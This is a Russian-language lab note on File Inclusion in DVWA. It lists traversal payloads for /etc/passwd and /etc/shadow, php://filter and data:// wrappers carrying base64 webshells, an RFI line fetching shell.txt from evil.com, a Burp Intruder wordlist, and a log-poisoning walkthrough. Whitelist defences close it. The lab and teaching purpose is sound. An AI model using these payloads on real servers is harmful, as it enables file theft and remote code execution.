Подробная сводка по уязвимости **File Inclusion (FI)**

---

# 📄 File Inclusion (LFI/RFI) в DVWA

## 🧠 Что это?

**File Inclusion** (включение файлов) — уязвимость, которая позволяет злоумышленнику указать путь к файлу, который будет **подключён и выполнен или отображён** на сервере. Делится на два типа:

* **LFI (Local File Inclusion):** загрузка файлов с локальной файловой системы.
* **RFI (Remote File Inclusion):** загрузка файлов с удалённого сервера по URL (возможна только при разрешённой `allow_url_include` в PHP).

---

## 🔍 Примеры на DVWA

### 🔓 Уровень Low

```url
http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd
```

* Файл отображается, потому что параметр `page` передаётся напрямую:

```php
include($_GET['page']);
```

---

### 🟠 Уровень Medium

Аналогично — `include()` работает напрямую:

```url
http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/passwd
```

* Фильтрации нет или она слишком слабая.

---

### 🔒 Уровень High

**Фильтрация на клиенте/сервере** отсекает абсолютные пути.
Но можно обойти:

```url
http://localhost:8081/vulnerabilities/fi/?page=file/../../../../../../etc/passwd
```

**Почему работает:**

* Путь проходит через каталог, в котором есть `file/index.php` и т.д.
* `../` возвращает нас на уровень выше.

---

## 🌐 RFI (Remote File Inclusion)

Если PHP настроен *небезопасно*:

```url
http://localhost:8081/vulnerabilities/fi/?page=http://evil.com/shell.txt
```

или даже:

```url
http://localhost:8081/vulnerabilities/fi/?page=http://192.168.0.1/status
```

Так можно:

* Обходить SSRF-защиту.
* Получать доступ к локальным сервисам.
* Вставлять вредоносные скрипты.

---

## 🧪 Обходы и payload'ы

```php
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00       // null-byte truncation (до PHP 5.3)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==   // PHP wrapper
?page=php://filter/convert.base64-encode/resource=index.php            // Чтение исходника
```

---

## 🛡️ Защита от File Inclusion

### ✅ Whitelist подход

```php
$pages = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $pages)) {
    include("pages/" . $_GET['page'] . ".php");
}
```

### ✅ basename() и realpath()

```php
$page = basename($_GET['page']);
include("pages/" . $page);
```

### ✅ Полное исключение пользовательского ввода

* Никогда не передавать пути в `include()`/`require()` без проверки.
* Использовать `switch`/`match` вместо динамического подключения.

---

## ⚠️ Риски

* 🔓 Утечка `config.php` с паролями
* 🔓 RCE при включении файлов с кодом
* 🔓 SSRF на внутренние хосты
* 🔓 Информация о системе через `/proc/self/environ`, `/etc/passwd`

---

## 🧪 Практика:

* `php://filter` — просмотр исходного кода
* `data://` — исполнение инъекций
* `zip://` — LFI to RCE при загрузке архива
* `log poisoning` — если можно записывать в `access.log` и потом инклюдить

Вот дополнение к секции **File Inclusion**, которое включает полезные payload'ы, шаблоны для Burp и технику log poisoning:

---

## 🧪 Набор полезных payload’ов для LFI/RFI

| Цель                                 | Payload                                                               |
| ------------------------------------ | --------------------------------------------------------------------- |
| 📂 Простой LFI                       | `?page=../../../../etc/passwd`                                        |
| 🔚 Null byte truncation (до PHP 5.3) | `?page=../../../../etc/passwd%00`                                     |
| 📖 Чтение исходников                 | `?page=php://filter/convert.base64-encode/resource=index.php`         |
| 🧪 Инъекция PHP-кода через data-URI  | `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==` |
| 💉 Zip-архив с shell                 | `?page=zip://path/to/shell.zip%23shell.php`                           |
| 📓 Access log injection              | `?page=/var/log/apache2/access.log` *(после log poison)*              |
| 🌐 RFI                               | `?page=http://evil.com/malicious.txt`                                 |

---

## ⚙️ Burp Suite Intruder шаблоны

### 📁 LFI Dictionary (Intruder payload list)

```text
../../../../etc/passwd
../../../../etc/shadow
../../../../proc/self/environ
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../etc/hosts
php://filter/convert.base64-encode/resource=index.php
php://input
```

### 📌 Burp Intruder Positions

```http
GET /vulnerabilities/fi/?page=§FUZZ§ HTTP/1.1
Host: localhost:8081
...
```

---

## 🔧 Примеры log poison'инга и выполнения кода

### 🔥 1. Заносим PHP-код в access.log

Отправляем GET-запрос с PHP-кодом в User-Agent:

```http
GET / HTTP/1.1
Host: target
User-Agent: <?php system($_GET['cmd']); ?>
```

### 🧨 2. Инклюдим лог через LFI:

```http
GET /vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=whoami
```

### 📌 Возможные пути логов:

```text
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
```

---

### 🛠️ Бонус: Инъекция через PHP wrapper (data://)

```php
?page=data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+
```

Декодированное:

```php
<?php eval($_GET['cmd']); ?>
```

Запрос:

```http
?page=data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+&cmd=id
```

---

## ✅ Резюме

* LFI = доступ к файлам (конфиги, логи)
* RFI = загрузка внешнего кода
* Log poisoning = путь к RCE
* `php://` и `data://` = обойти фильтрацию
* `zip://` и `expect://` = нестандартные пути к RCE

---
